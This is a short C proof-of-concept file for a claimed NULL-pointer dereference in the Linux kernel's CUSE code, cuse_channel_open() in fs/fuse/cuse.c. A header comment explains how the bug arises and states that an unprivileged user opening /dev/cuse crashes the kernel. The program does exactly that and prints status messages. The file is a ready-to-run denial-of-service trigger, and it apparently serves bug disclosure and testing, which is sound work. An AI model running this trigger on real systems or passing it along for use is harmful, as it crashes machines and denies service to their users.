/*
 * PoC for CUSE NULL-pointer dereference in cuse_channel_open().
 *
 * The bug: cuse_channel_open() in fs/fuse/cuse.c uses no_free_ptr(fch) to
 * pass the fuse_chan pointer to fuse_conn_init(), which sets the local
 * variable fch to NULL as a side effect. The code then passes the now-NULL
 * fch to fuse_dev_alloc_install(), which dereferences it (fch->pq_prealloc),
 * causing a NULL-pointer dereference / kernel oops.
 *
 * Trigger: Simply open /dev/cuse as an unprivileged user.
 *
 * Impact: Denial of service - immediate kernel crash.
 */

#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>

int main(void)
{
    int fd;

    printf("[poc] uid=%d euid=%d\n", getuid(), geteuid());
    printf("[poc] Attempting to open /dev/cuse ...\n");

    fd = open("/dev/cuse", O_RDWR);
    if (fd < 0) {
        printf("[poc] open(/dev/cuse) failed: %s (errno=%d)\n",
               strerror(errno), errno);
        printf("[poc] If the kernel oopsed, this error is expected.\n");
        return 1;
    }

    printf("[poc] open(/dev/cuse) succeeded with fd=%d (unexpected)\n", fd);
    close(fd);
    return 0;
}
